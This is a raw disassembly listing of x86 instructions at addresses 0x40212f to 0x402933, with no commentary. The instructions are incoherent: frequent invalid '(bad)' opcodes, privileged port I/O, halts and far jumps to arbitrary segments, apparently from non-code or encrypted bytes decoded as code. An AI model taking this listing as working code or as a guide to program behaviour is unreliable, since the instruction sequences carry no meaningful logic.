  40212f:	xchg   esp,eax
  402130:	mov    edi,0x975f8c1b
  402135:	mov    ebp,0x657757e6
  40213a:	inc    ebp
  40213b:	sub    eax,0xbaea8baf
  402140:	mov    edx,0x7ea41808
  402145:	ja     0x402161
  402147:	xchg   edi,eax
  402148:	mov    ecx,0x49a85743
  40214d:	xor    al,0xa8
  40214f:	in     al,0xb7
  402151:	adc    ebp,DWORD PTR [edi-0x25dbefd5]
  402157:	push   edi
  402158:	fdiv   QWORD PTR [edx+0x3]
  40215b:	add    al,0x8a
  40215d:	add    al,0xf3
  40215f:	outs   dx,BYTE PTR ds:[esi]
  402160:	stc    
  402161:	adc    dl,0x1c
  402164:	add    al,0x71
  402166:	sti    
  402167:	jnp    0x4020f6
  402169:	in     eax,0x69
  40216b:	dec    DWORD PTR [ecx]
  40216d:	(bad)  
  40216e:	out    dx,al
  40216f:	jg     0x40214d
  402171:	rcr    DWORD PTR [ebp-0x1f],1
  402174:	pop    es
  402175:	xchg   DWORD PTR [esi+0x7b],ebp
  402178:	fldcw  WORD PTR [ecx]
  40217a:	inc    esp
  40217b:	jmp    0x4021d1
  40217d:	iret   
  40217e:	mov    DWORD PTR [edi+0x75],esp
  402181:	mov    edi,DWORD PTR [ebp+0xb]
  402184:	in     eax,0xc9
  402186:	sub    edx,ecx
  402188:	xor    eax,0xdf4a917e
  40218d:	sbb    BYTE PTR [ebx],0xfd
  402190:	hlt    
  402191:	sub    DWORD PTR [esi-0x41],0x21
  402195:	mov    eax,ds:0x15a71059
  40219a:	mov    ah,0x3b
  40219c:	ret    
  40219d:	das    
  40219e:	cmp    al,0xec
  4021a0:	js     0x4021b8
  4021a2:	stc    
  4021a3:	in     eax,0x15
  4021a5:	mov    eax,ds:0x381a8dac
  4021aa:	popf   
  4021ab:	dec    ebx
  4021ac:	push   0x532fccf8
  4021b1:	je     0x402165
  4021b3:	jmp    0x4021a3
  4021b5:	shl    BYTE PTR [ecx+0x4c],0xf9
  4021b9:	inc    ebp
  4021ba:	cwde   
  4021bb:	hlt    
  4021bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021bd:	ret    0xa2d6
  4021c0:	out    0x3d,eax
  4021c2:	jne    0x402154
  4021c4:	nop
  4021c5:	loope  0x402157
  4021c7:	xor    ch,BYTE PTR [eax+edx*4+0x10]
  4021cb:	cmp    DWORD PTR [ecx+0x5b1087f0],ecx
  4021d1:	jmp    0xbf11:0xe04ce7f3
  4021d8:	mov    bh,0x60
  4021da:	(bad)  
  4021db:	inc    esp
  4021dc:	mov    ds:0x4a24f575,al
  4021e1:	push   ebx
  4021e2:	mov    BYTE PTR [ebx+0x54ad9ebe],bh
  4021e8:	xchg   BYTE PTR [edi-0x2d],al
  4021eb:	lahf   
  4021ec:	sbb    al,0xaf
  4021ee:	mul    BYTE PTR [esi+eax*4-0x56]
  4021f2:	data16 cmp ah,0x4f
  4021f6:	mov    ds:0x6cc0df82,eax
  4021fb:	xor    ch,bh
  4021fd:	cmp    BYTE PTR [ecx+0x22e57661],cl
  402203:	test   dh,0xe0
  402206:	xchg   esi,eax
  402207:	int3   
  402208:	sbb    DWORD PTR [edi-0x70b3e813],ecx
  40220e:	mov    ebx,0x6113c0ae
  402213:	aad    0x40
  402215:	and    BYTE PTR [eax+0x3e],0x3b
  402219:	jb     0x4021c4
  40221b:	adc    al,0x9b
  40221d:	test   eax,0x457eaa07
  402222:	loope  0x402207
  402224:	mov    dh,0x34
  402226:	sub    al,0x3
  402228:	aaa    
  402229:	cmp    eax,0x9e8b7408
  40222e:	mov    bh,0xf6
  402230:	push   cs
  402231:	adc    ch,ch
  402233:	jno    0x402214
  402235:	or     BYTE PTR ds:0xf83078a4,dh
  40223b:	iret   
  40223c:	ins    DWORD PTR es:[edi],dx
  40223d:	int    0xbd
  40223f:	push   ecx
  402240:	jmp    0x75e2:0xe3ebd473
  402247:	mov    dl,0xe8
  402249:	mov    ah,bh
  40224b:	out    0x1a,al
  40224d:	mov    BYTE PTR [edx+edx*4+0x7b],bh
  402251:	sbb    al,BYTE PTR [ebp-0x766c6cac]
  402257:	jge    0x4021ff
  402259:	mov    bh,0xa5
  40225b:	inc    ecx
  40225c:	lea    ecx,[eax]
  40225e:	rcr    dh,1
  402260:	fist   DWORD PTR [edx+0x75]
  402263:	inc    ebp
  402264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402266:	mov    esp,0x8df74ac6
  40226b:	js     0x402217
  40226d:	or     eax,0xc81c1971
  402272:	xchg   esp,eax
  402273:	cmp    DWORD PTR [bx-0x45],0x1b6b8f92
  40227b:	idiv   BYTE PTR [edi]
  40227d:	sbb    al,0x0
  40227f:	mov    DWORD PTR [edi],edx
  402281:	mov    ebx,0x887b2224
  402286:	mov    al,0x4f
  402288:	jmp    0x86fa2cc8
  40228d:	and    ebx,DWORD PTR [edx+0x19]
  402290:	pop    esp
  402291:	and    BYTE PTR [edx],dl
  402293:	ja     0x40229d
  402295:	fnstcw WORD PTR [ebx-0x79]
  402298:	mov    ebp,0x12d67211
  40229d:	out    dx,al
  40229e:	xchg   esi,eax
  40229f:	xor    BYTE PTR [edi+0x34],dh
  4022a2:	dec    esp
  4022a3:	pop    ecx
  4022a4:	mov    es,WORD PTR [ecx+eiz*1+0x4bf628d6]
  4022ab:	fidivr WORD PTR [edi+eax*2]
  4022ae:	out    0xaf,eax
  4022b0:	imul   ebx,DWORD PTR [eax-0x14],0x21952b77
  4022b7:	and    al,0xaf
  4022b9:	pop    ebp
  4022ba:	popa   
  4022bb:	retf   
  4022bc:	lahf   
  4022bd:	mov    dl,BYTE PTR [esi]
  4022bf:	clc    
  4022c0:	pop    es
  4022c1:	mov    ch,0xde
  4022c3:	fadd   QWORD PTR [ebx]
  4022c5:	rcr    BYTE PTR [ebp-0x34],1
  4022c8:	fild   WORD PTR [eax+0x348bde6a]
  4022ce:	hlt    
  4022cf:	mov    cl,0x3d
  4022d1:	pop    edx
  4022d2:	pop    esp
  4022d3:	jbe    0x40234f
  4022d5:	sub    al,0xe2
  4022d7:	sbb    al,0x2b
  4022d9:	aas    
  4022da:	mov    al,0x44
  4022dc:	xor    eax,0xd58cd2db
  4022e1:	jle    0x4022a7
  4022e3:	scas   al,BYTE PTR es:[edi]
  4022e4:	ret    
  4022e5:	jmp    0x4022d9
  4022e7:	sahf   
  4022e8:	jae    0x4022f3
  4022ea:	push   0xabc5c7d6
  4022ef:	dec    edx
  4022f0:	imul   ebx,DWORD PTR [ecx-0x47],0x49612ed
  4022f7:	(bad)  
  4022f8:	repz xor eax,0x86125911
  4022fe:	aas    
  4022ff:	mov    ?,WORD PTR [esi]
  402301:	xor    al,0x1a
  402303:	fnstcw WORD PTR [edx-0x6f]
  402306:	sbb    eax,0x689414e4
  40230b:	daa    
  40230c:	lds    eax,FWORD PTR [eax+0x28]
  40230f:	add    bh,BYTE PTR [eax+0x42]
  402312:	adc    esi,DWORD PTR [ecx+ecx*1+0x1dfae523]
  402319:	dec    esi
  40231a:	sub    eax,0xb88c54e7
  40231f:	push   0x564d76a0
  402324:	data16 clc 
  402326:	xchg   edx,eax
  402327:	popa   
  402328:	lock adc esp,ebp
  40232b:	aad    0x76
  40232d:	lahf   
  40232e:	xor    eax,0x7537f73f
  402333:	mov    edi,0xdb1b5b0
  402338:	leave  
  402339:	pop    eax
  40233a:	pop    esp
  40233b:	rol    esi,1
  40233d:	int    0x86
  40233f:	sbb    al,0x89
  402341:	jg     0x40237e
  402343:	dec    esi
  402344:	adc    BYTE PTR es:[ebp+edi*2-0x53f001b5],cl
  40234c:	xor    eax,0x7e295b0f
  402351:	xchg   ebp,eax
  402352:	pop    edi
  402353:	cmc    
  402354:	xor    DWORD PTR [eax+eiz*8+0x5f],0x7e5cfe5f
  40235c:	scas   eax,DWORD PTR es:[edi]
  40235d:	(bad)  
  40235e:	xchg   esi,eax
  40235f:	push   edx
  402360:	dec    ebp
  402361:	cs retf 0x4bf6
  402365:	mov    al,0x62
  402367:	mov    edx,0xc54aa5a3
  40236c:	add    BYTE PTR [ecx],0x21
  40236f:	xlat   BYTE PTR ds:[ebx]
  402370:	pop    eax
  402371:	xor    eax,0x6856530a
  402376:	pop    eax
  402377:	aaa    
  402378:	addr16 push edi
  40237a:	outs   dx,DWORD PTR ds:[esi]
  40237b:	aas    
  40237c:	add    al,0xb0
  40237e:	int    0x2b
  402380:	or     eax,0x883f603e
  402385:	xor    edx,ebx
  402387:	adc    DWORD PTR [edi-0x12],ebp
  40238a:	xchg   esp,eax
  40238b:	stos   DWORD PTR es:[edi],eax
  40238c:	push   esp
  40238d:	ret    
  40238e:	jbe    0x402373
  402390:	pop    ss
  402391:	dec    edx
  402392:	xlat   BYTE PTR ds:[ebx]
  402393:	(bad)  
  402394:	fild   DWORD PTR [edi+0x26814b81]
  40239a:	aaa    
  40239b:	neg    BYTE PTR [edx+0x4585f756]
  4023a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023a2:	or     eax,0x4d129547
  4023a7:	ret    
  4023a8:	bound  esi,QWORD PTR [edi+0x31]
  4023ab:	mov    eax,0x8d4361af
  4023b0:	scas   eax,DWORD PTR es:[edi]
  4023b1:	jecxz  0x402420
  4023b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023b4:	les    ebp,FWORD PTR [edi]
  4023b6:	xchg   ecx,eax
  4023b7:	fiadd  WORD PTR [eax+0x513cdcbc]
  4023bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023be:	fimul  WORD PTR [ecx+0x37283a54]
  4023c4:	dec    esi
  4023c5:	mov    ebx,esi
  4023c7:	mov    al,ds:0x4adca9b0
  4023cc:	pushf  
  4023cd:	xchg   esp,eax
  4023ce:	lods   al,BYTE PTR ds:[esi]
  4023cf:	cmp    edi,eax
  4023d1:	adc    al,0xf2
  4023d3:	call   0xeab:0x326246a2
  4023da:	xor    eax,ebx
  4023dc:	jge    0x402416
  4023de:	push   0xffffffa7
  4023e0:	xor    eax,0x69678c3a
  4023e5:	mov    dl,BYTE PTR [ebx+0x3cb0ca7d]
  4023eb:	sbb    BYTE PTR ds:0xa8dfea4b,al
  4023f1:	call   0x20a2:0x8e736382
  4023f8:	ja     0x402409
  4023fa:	push   ebp
  4023fb:	dec    edx
  4023fc:	(bad)  
  4023fd:	jmp    0x4023ca
  4023ff:	xor    eax,0x96f174aa
  402404:	push   0x79
  402406:	adc    edx,edi
  402408:	rcl    BYTE PTR [edi],0x8d
  40240b:	mov    al,ds:0xd4716e6e
  402410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402411:	jp     0x402415
  402413:	cdq    
  402414:	xor    ecx,DWORD PTR [eax-0x52]
  402417:	add    eax,0x5221c4f4
  40241c:	sbb    ecx,ebx
  40241e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40241f:	jns    0x4023fe
  402421:	mov    edi,0x853e167d
  402426:	push   0x72388a60
  40242b:	test   BYTE PTR [edi+eax*8],dh
  40242e:	test   esp,0x9a2ed7a8
  402434:	(bad)  
  402435:	or     al,0x6c
  402437:	(bad)  [ebx+eax*4+0x48a6c1f1]
  40243e:	loop   0x402483
  402440:	out    dx,eax
  402441:	fdiv   QWORD PTR [edi+0x73]
  402444:	xor    dl,ch
  402446:	shl    DWORD PTR [edx],1
  402448:	mov    dh,0x54
  40244a:	add    BYTE PTR [esi+0xcb73637],bl
  402450:	mov    ch,0x71
  402452:	(bad)  
  402453:	jg     0x40249f
  402455:	sub    esi,DWORD PTR [ebx-0x10fe3195]
  40245b:	mov    edi,0x80e25313
  402460:	nop
  402461:	mov    eax,ds:0x36d8ed4c
  402466:	xchg   edx,eax
  402467:	ss addr16 inc edi
  40246a:	stos   BYTE PTR es:[edi],al
  40246b:	cld    
  40246c:	push   ss
  40246d:	ja     0x4024d3
  40246f:	push   esi
  402470:	cmp    eax,0x8829cfee
  402475:	sub    eax,0x9b08d2fd
  40247a:	neg    ah
  40247c:	jle    0x4024c2
  40247e:	inc    esp
  40247f:	push   ecx
  402480:	xlat   BYTE PTR ds:[ebx]
  402481:	jge    0x40248a
  402483:	fwait
  402484:	pop    esp
  402485:	not    ah
  402487:	pushf  
  402488:	xchg   edx,eax
  402489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40248a:	call   0x337c4cf6
  40248f:	adc    eax,0x7f77fbec
  402494:	popf   
  402495:	mov    BYTE PTR [eax+ebx*2+0x57],ah
  402499:	xchg   ecx,eax
  40249a:	push   cs
  40249b:	outs   dx,BYTE PTR ds:[esi]
  40249c:	inc    esp
  40249d:	pop    esi
  40249e:	jnp    0x4024ce
  4024a0:	ja     0x402452
  4024a2:	mov    DWORD PTR [ebx],ebp
  4024a4:	retf   
  4024a5:	pop    ebx
  4024a6:	aam    0x57
  4024a8:	out    dx,eax
  4024a9:	in     eax,0x88
  4024ab:	jo     0x402508
  4024ad:	inc    edi
  4024ae:	sub    BYTE PTR [ebx],cl
  4024b0:	outs   dx,DWORD PTR ds:[esi]
  4024b1:	ror    BYTE PTR [ecx],0xc1
  4024b4:	ret    
  4024b5:	or     edi,DWORD PTR [ebx+0x1657fa1f]
  4024bb:	inc    ebx
  4024bc:	ins    DWORD PTR es:[edi],dx
  4024bd:	pop    edi
  4024be:	adc    BYTE PTR [edx+ebp*8+0x60f446c2],dl
  4024c5:	int3   
  4024c6:	sub    dl,ah
  4024c8:	jo     0x40249a
  4024ca:	adc    eax,DWORD PTR [edx+0x45aea1d6]
  4024d0:	icebp  
  4024d1:	rcl    ecx,1
  4024d3:	lahf   
  4024d4:	xor    cl,cl
  4024d6:	mov    ecx,0x523a1d62
  4024db:	cmc    
  4024dc:	int3   
  4024dd:	rol    bh,1
  4024df:	mov    edi,0x85aeab4f
  4024e4:	(bad)  
  4024e5:	icebp  
  4024e6:	idiv   DWORD PTR [edi+0x33]
  4024e9:	mul    DWORD PTR gs:[edi-0x39]
  4024ed:	xchg   ebx,eax
  4024ee:	push   cs
  4024ef:	or     al,BYTE PTR [ebp+0x63]
  4024f2:	xor    DWORD PTR [eax],eax
  4024f4:	push   ebp
  4024f5:	inc    esi
  4024f6:	in     eax,dx
  4024f7:	push   edi
  4024f8:	lahf   
  4024f9:	xor    eax,0x9c74f443
  4024fe:	mov    ds:0xb126e038,al
  402503:	arpl   WORD PTR [edx-0x3d17ec36],dx
  402509:	iret   
  40250a:	and    BYTE PTR [ebp+0x348c77a6],bh
  402510:	adc    dh,BYTE PTR [edx-0x6e]
  402513:	pop    ebx
  402514:	pop    edi
  402515:	dec    ebx
  402516:	xor    edi,DWORD PTR [eax+0x86333a4]
  40251c:	mov    esi,0x7b91e5eb
  402521:	aaa    
  402522:	popf   
  402523:	add    bh,BYTE PTR [edi-0x739da7c6]
  402529:	push   ecx
  40252a:	jne    0x40256c
  40252c:	pop    edi
  40252d:	jno    0x402520
  40252f:	push   ebx
  402530:	or     eax,esi
  402532:	pop    esp
  402533:	iret   
  402534:	cwde   
  402535:	scas   eax,DWORD PTR es:[edi]
  402536:	hlt    
  402537:	push   eax
  402538:	es mov bh,0x38
  40253b:	mov    al,ds:0x9ebbac78
  402540:	imul   ecx,DWORD PTR [edx],0x6ab334dd
  402546:	xor    DWORD PTR [ebx],ecx
  402548:	lds    eax,FWORD PTR [ecx+ebp*4+0x1a]
  40254c:	jl     0x40259e
  40254e:	mov    dl,dl
  402550:	rcl    DWORD PTR [edx],cl
  402552:	and    al,0xa0
  402554:	adc    ah,dh
  402556:	and    esp,DWORD PTR [eax]
  402558:	sbb    bl,ch
  40255a:	mov    esp,0x67eaa6b6
  40255f:	dec    ebx
  402560:	jg     0x402567
  402562:	mov    BYTE PTR [edi-0x1f44efca],dh
  402568:	jb     0x4025cd
  40256a:	rcr    DWORD PTR [eax+0x3d],cl
  40256d:	or     al,0xf9
  40256f:	mov    eax,ds:0xd709e9d4
  402574:	imul   ebp,DWORD PTR [esi+0x2a9026a8],0x1828f4c7
  40257e:	sbb    DWORD PTR [ebp+0x3a],ebx
  402581:	test   al,0x3d
  402583:	imul   edx
  402585:	fdiv   QWORD PTR ds:0x825882ed
  40258b:	push   cs
  40258c:	out    0xaf,al
  40258e:	jg     0x402587
  402590:	(bad)  
  402591:	lahf   
  402592:	popf   
  402593:	inc    ebp
  402594:	dec    ecx
  402595:	cmp    ebp,esi
  402597:	ficomp WORD PTR [edx+0x57]
  40259a:	push   0x2de94a96
  40259f:	aaa    
  4025a0:	pmullw mm1,QWORD PTR [eax]
  4025a3:	out    0xc9,al
  4025a5:	add    cl,BYTE PTR [ebx+0x70e83807]
  4025ab:	jge    0x402597
  4025ad:	dec    eax
  4025ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025af:	fcmovnu st,st(4)
  4025b1:	or     BYTE PTR [ebx+0x79],bl
  4025b4:	mov    ds:0x3ccb895a,eax
  4025b9:	mov    ds:0xb3e2b7e9,al
  4025be:	sub    eax,0xef6e37d7
  4025c3:	daa    
  4025c4:	inc    esp
  4025c5:	fisub  DWORD PTR [ebx-0x665e616b]
  4025cb:	mov    edx,0xf3355a13
  4025d0:	inc    edx
  4025d1:	jbe    0x4025f1
  4025d3:	mov    cl,0x62
  4025d5:	sub    BYTE PTR [eax-0x6bfda483],bh
  4025db:	(bad)  
  4025dc:	mov    ecx,0xa8451351
  4025e1:	popf   
  4025e2:	xchg   ebp,eax
  4025e3:	hlt    
  4025e4:	adc    al,0x9
  4025e6:	push   edi
  4025e7:	push   ebx
  4025e8:	push   ebx
  4025e9:	xchg   edx,edi
  4025eb:	out    dx,al
  4025ec:	jns    0x402652
  4025ee:	xor    dh,BYTE PTR [ecx-0x43882ba6]
  4025f4:	xor    edi,DWORD PTR [edi]
  4025f6:	dec    esi
  4025f7:	out    dx,al
  4025f8:	and    ecx,DWORD PTR [eax+edi*2]
  4025fb:	pop    ebx
  4025fc:	mov    bl,0x3e
  4025fe:	xor    ah,BYTE PTR [edi+esi*8+0x5b]
  402602:	add    cl,bh
  402604:	rcl    DWORD PTR [eax+0x1aa1e6b1],0x59
  40260b:	fistp  WORD PTR [edi]
  40260d:	jae    0x40262d
  40260f:	pop    ds
  402610:	call   0xf70a:0x8f14d871
  402617:	mov    ecx,0x92a0adbe
  40261c:	and    dh,BYTE PTR [ebx]
  40261e:	sbb    al,0xc
  402620:	adc    DWORD PTR [esi+0x4715ef93],ecx
  402626:	mov    ecx,0xbff1496e
  40262b:	inc    ecx
  40262c:	adc    eax,0xe711eac
  402631:	adc    ebp,edx
  402633:	fdivp  st(4),st
  402635:	addr16 loop 0x40262e
  402638:	inc    ebp
  402639:	(bad)  
  40263a:	addr16 pushf 
  40263c:	ror    DWORD PTR [esi-0x78],0x0
  402640:	popa   
  402641:	sub    al,0x63
  402643:	xor    al,0x14
  402645:	stos   BYTE PTR es:[edi],al
  402646:	cld    
  402647:	add    bh,cl
  402649:	ins    BYTE PTR es:[edi],dx
  40264a:	dec    ebp
  40264b:	inc    ebx
  40264c:	add    ch,BYTE PTR [ecx-0x57]
  40264f:	shl    DWORD PTR [edx],1
  402651:	sub    dl,dl
  402653:	jo     0x4025f8
  402655:	int3   
  402656:	mov    al,BYTE PTR [esi+0x67]
  402659:	shl    dl,cl
  40265b:	xor    DWORD PTR [eax+0x382735d4],0xffffff94
  402662:	rcr    cl,0xf2
  402665:	in     al,dx
  402666:	sub    al,0x15
  402668:	dec    ebp
  402669:	pop    ss
  40266a:	icebp  
  40266b:	jmp    0x4025fc
  40266d:	push   0xb3af0318
  402672:	inc    esi
  402673:	add    DWORD PTR [ebx+edx*2+0x6c899ed0],esi
  40267a:	add    DWORD PTR [esi-0x4b],edi
  40267d:	(bad)  
  40267f:	sbb    BYTE PTR [ebx+0x28d26f81],0x42
  402686:	in     eax,0x5c
  402688:	jmp    0xee31:0x75ec2107
  40268f:	add    eax,0x28e39484
  402694:	mov    ds:0x30fcb1da,al
  402699:	cmp    eax,0xf1fb2c71
  40269e:	cmp    eax,0x8ba59a7b
  4026a3:	jle    0x402707
  4026a5:	jmp    DWORD PTR [edx+0x7b]
  4026a8:	cmc    
  4026a9:	push   cs
  4026aa:	mov    ds:0xa0e2c430,al
  4026af:	mov    DWORD PTR [bp+si-0x2f1f],0xec9e105d
  4026b8:	add    dh,BYTE PTR [esi-0x244ec010]
  4026be:	ins    BYTE PTR es:[edi],dx
  4026bf:	repz dec ebp
  4026c1:	data16 arpl WORD PTR [ebp+ebx*4+0x12a849e1],ax
  4026c9:	sbb    al,0x68
  4026cb:	mov    ebp,0xc98bc55a
  4026d0:	ret    0xf365
  4026d3:	mov    al,BYTE PTR [eax-0x9]
  4026d6:	mov    cl,0xac
  4026d8:	je     0x402733
  4026da:	mov    ?,WORD PTR [esi+0x694195fa]
  4026e0:	jne    0x40268b
  4026e2:	int3   
  4026e3:	call   0x50c6f285
  4026e8:	repz jno 0x4026ee
  4026eb:	cdq    
  4026ec:	push   cs
  4026ed:	push   edx
  4026ee:	jmp    DWORD PTR [edx+0x69]
  4026f1:	in     eax,0x2b
  4026f3:	push   ds
  4026f4:	sub    al,0xe9
  4026f6:	aam    0xde
  4026f8:	(bad)  
  4026f9:	ja     0x402755
  4026fb:	mov    ds:0x1c4abe63,eax
  402700:	mov    edx,0x78ba8658
  402705:	jb     0x4026f6
  402707:	adc    al,0x2e
  402709:	mov    bh,0xad
  40270b:	mov    esp,0x6a45b843
  402710:	cmp    DWORD PTR [edi+edx*1+0x18d31d73],0x7e124a47
  40271b:	jbe    0x402786
  40271d:	loopne 0x40272a
  40271f:	sbb    eax,ecx
  402721:	or     ah,BYTE PTR [edi+edx*1]
  402724:	fst    DWORD PTR [ebx+ecx*1]
  402727:	std    
  402728:	mov    al,0x3b
  40272a:	add    edi,DWORD PTR [esi-0x33]
  40272d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40272e:	into   
  40272f:	adc    ecx,DWORD PTR [edi+0x30d66085]
  402735:	adc    BYTE PTR [esi],cl
  402737:	sahf   
  402738:	imul   ecx,DWORD PTR [ebp+0x19],0xf333cd44
  40273f:	(bad)  
  402740:	push   edx
  402741:	sti    
  402742:	(bad)  
  402743:	cmp    al,0x3
  402745:	add    eax,0xfaa7615a
  40274a:	and    eax,0xa0395aaf
  40274f:	push   eax
  402750:	es enter 0x4999,0xe8
  402755:	jnp    0x40278b
  402757:	int3   
  402758:	push   cs
  402759:	(bad)  
  40275a:	int3   
  40275b:	retf   0x3e51
  40275e:	jb     0x4027de
  402760:	neg    BYTE PTR [ebx+0x18706d6f]
  402766:	retf   0x9df3
  402769:	jge    0x402722
  40276b:	repz adc al,0x61
  40276e:	test   edx,0x6775e934
  402774:	pop    ebx
  402775:	xor    eax,0x72749169
  40277a:	fs pop ebx
  40277c:	idiv   DWORD PTR [esi+0x39]
  40277f:	and    eax,DWORD PTR [edx]
  402781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402782:	retf   0x2a6e
  402785:	pusha  
  402786:	ins    BYTE PTR es:[edi],dx
  402787:	mov    al,ds:0xd315d7a2
  40278c:	pop    eax
  40278d:	lods   al,BYTE PTR ds:[esi]
  40278e:	push   esp
  40278f:	and    eax,0x130b907b
  402794:	(bad)  [edi-0x40]
  402797:	push   ebp
  402798:	lock out dx,eax
  40279a:	add    al,0x97
  40279c:	std    
  40279d:	inc    ecx
  40279e:	push   ebx
  40279f:	out    0x65,eax
  4027a1:	ss nop
  4027a3:	dec    eax
  4027a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027a5:	inc    esp
  4027a6:	sub    dh,BYTE PTR [ebp-0x12]
  4027a9:	call   0x1732121b
  4027ae:	xor    al,0xbe
  4027b0:	scas   eax,DWORD PTR es:[edi]
  4027b1:	pop    edi
  4027b2:	jbe    0x4027a8
  4027b4:	xor    ebx,DWORD PTR [eax]
  4027b6:	push   ebp
  4027b7:	mov    eax,ds:0x53be0095
  4027bc:	mov    esi,DWORD PTR [eax+ebp*2+0x22f30dc9]
  4027c3:	sub    BYTE PTR [ebp-0x6ca17fec],ch
  4027c9:	dec    esp
  4027ca:	add    ebp,DWORD PTR [edi+0x5cb81633]
  4027d0:	xchg   esp,eax
  4027d1:	xchg   edi,eax
  4027d2:	scas   eax,DWORD PTR es:[edi]
  4027d3:	ja     0x402768
  4027d5:	sbb    DWORD PTR [eax-0x658d71ea],ebp
  4027db:	inc    DWORD PTR [edx+0xbd8bd44]
  4027e1:	mov    bh,0xa0
  4027e3:	mov    esp,0x77b174c2
  4027e8:	je     0x4027a0
  4027ea:	into   
  4027eb:	mov    bh,0x3b
  4027ed:	mov    al,0xa7
  4027ef:	ins    BYTE PTR es:[edi],dx
  4027f0:	mov    WORD PTR [esi-0x18],es
  4027f3:	test   al,0x24
  4027f5:	nop
  4027f6:	test   DWORD PTR [ecx+0x7edccbdf],eax
  4027fc:	cmc    
  4027fd:	pop    ebp
  4027fe:	push   ebp
  4027ff:	and    al,0x63
  402801:	jg     0x4027d0
  402803:	or     DWORD PTR [ebp-0x76],esi
  402806:	push   ds
  402807:	stc    
  402808:	(bad)  
  402809:	jbe    0x40278d
  40280b:	mov    esp,0x435cb488
  402810:	jmp    0x791:0x882b955d
  402817:	fst    DWORD PTR [eax]
  402819:	xor    BYTE PTR [ecx+ebx*2],cl
  40281c:	mov    eax,0xb666e6b9
  402821:	cmp    BYTE PTR [eax],dl
  402823:	(bad)  
  402825:	mov    WORD PTR [edx],es
  402827:	aaa    
  402828:	pop    ss
  402829:	add    al,dl
  40282b:	pushaw 
  40282d:	inc    ebp
  40282e:	pop    ecx
  40282f:	pop    esi
  402830:	repnz leave 
  402832:	jne    0x4027c7
  402834:	sbb    dl,BYTE PTR [eax-0x63]
  402837:	dec    esi
  402838:	mov    edx,0x73494b7b
  40283d:	shr    DWORD PTR [esi],cl
  40283f:	inc    ebx
  402840:	icebp  
  402841:	sbb    al,ah
  402843:	stos   DWORD PTR es:[edi],eax
  402844:	sub    al,0xc7
  402846:	(bad)  [edx+0x11b4d9fd]
  40284c:	mov    ebx,0x35e6ed8
  402851:	sub    al,0x4e
  402853:	xchg   BYTE PTR [ebp-0x36797c77],al
  402859:	or     dh,BYTE PTR [edx+0x11b07318]
  40285f:	xor    esp,esi
  402861:	test   BYTE PTR [eax],cl
  402863:	cli    
  402864:	mov    al,0x2a
  402866:	pop    ebp
  402867:	jne    0x402862
  402869:	mov    bl,0xc9
  40286b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40286c:	add    esi,DWORD PTR [eax+0x7adfd8b5]
  402872:	xchg   esi,eax
  402873:	jmp    0x402808
  402875:	mov    DWORD PTR [esi+0x3a3f51a4],ebp
  40287b:	jb     0x402810
  40287d:	nop
  40287e:	das    
  40287f:	and    al,0x1a
  402881:	add    eax,0x6f5ecf71
  402886:	adc    eax,edi
  402888:	in     al,0x4c
  40288a:	xor    DWORD PTR [ecx],0x14f8ffd8
  402890:	or     ebp,DWORD PTR [ebp+0x7d]
  402893:	push   ss
  402894:	mov    ah,0xad
  402896:	xchg   edx,eax
  402897:	(bad)  
  402898:	dec    ebx
  402899:	cdq    
  40289a:	adc    al,0x13
  40289c:	pop    ss
  40289d:	push   ebp
  40289e:	and    al,0x85
  4028a0:	dec    eax
  4028a1:	cmc    
  4028a2:	or     DWORD PTR [ebx],ecx
  4028a4:	shl    BYTE PTR [ecx+0x5a],0xd5
  4028a8:	xor    edi,DWORD PTR [eax]
  4028aa:	cmp    BYTE PTR [ebx],bl
  4028ac:	ret    
  4028ad:	sub    eax,0xe4856ec6
  4028b2:	test   DWORD PTR [eax],esi
  4028b4:	mov    ebp,0xb044150e
  4028b9:	lods   eax,DWORD PTR ds:[esi]
  4028ba:	je     0x4028f8
  4028bc:	cwde   
  4028bd:	and    al,0x21
  4028bf:	ins    DWORD PTR es:[edi],dx
  4028c0:	add    eax,0xaaec8e22
  4028c5:	div    BYTE PTR [ecx-0x5606b387]
  4028cb:	xchg   edx,eax
  4028cc:	ds cs (bad) 
  4028cf:	adc    al,BYTE PTR [edi+0x47]
  4028d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028d3:	adc    eax,DWORD PTR [ecx+ecx*8+0x4e57cb0c]
  4028da:	jbe    0x402868
  4028dc:	and    eax,0x76428d72
  4028e1:	aad    0x54
  4028e3:	xor    dl,bh
  4028e5:	daa    
  4028e6:	and    edi,ebp
  4028e8:	sub    DWORD PTR [ebx-0x27],esp
  4028eb:	jb     0x4028be
  4028ed:	add    dl,BYTE PTR [ebx-0x3cd72435]
  4028f3:	sub    ebx,esp
  4028f5:	mov    cl,0x40
  4028f7:	test   al,0x8d
  4028f9:	sub    eax,0x576c7d7f
  4028fe:	outs   dx,DWORD PTR ds:[esi]
  4028ff:	in     eax,0xc6
  402901:	pop    ecx
  402902:	xchg   esp,eax
  402903:	inc    ecx
  402904:	ja     0x402937
  402906:	cli    
  402907:	pusha  
  402908:	icebp  
  402909:	call   0x3e61:0xe1e76262
  402910:	sbb    DWORD PTR [edx+edi*2],edi
  402913:	fcmovu st,st(7)
  402915:	mov    edx,0x755f1a0a
  40291a:	lods   eax,DWORD PTR ds:[esi]
  40291b:	mov    ecx,0x26c16227
  402920:	adc    al,0xfb
  402922:	pop    ebp
  402923:	test   BYTE PTR [esi+0x339fe77c],0x56
  40292a:	fsubrp st(0),st
  40292c:	loopne 0x4028f2
  40292e:	lods   al,BYTE PTR ds:[esi]
  40292f:	pop    ebp
  402930:	outs   dx,BYTE PTR ds:[esi]
  402931:	das    
  402932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402933:	push   edx
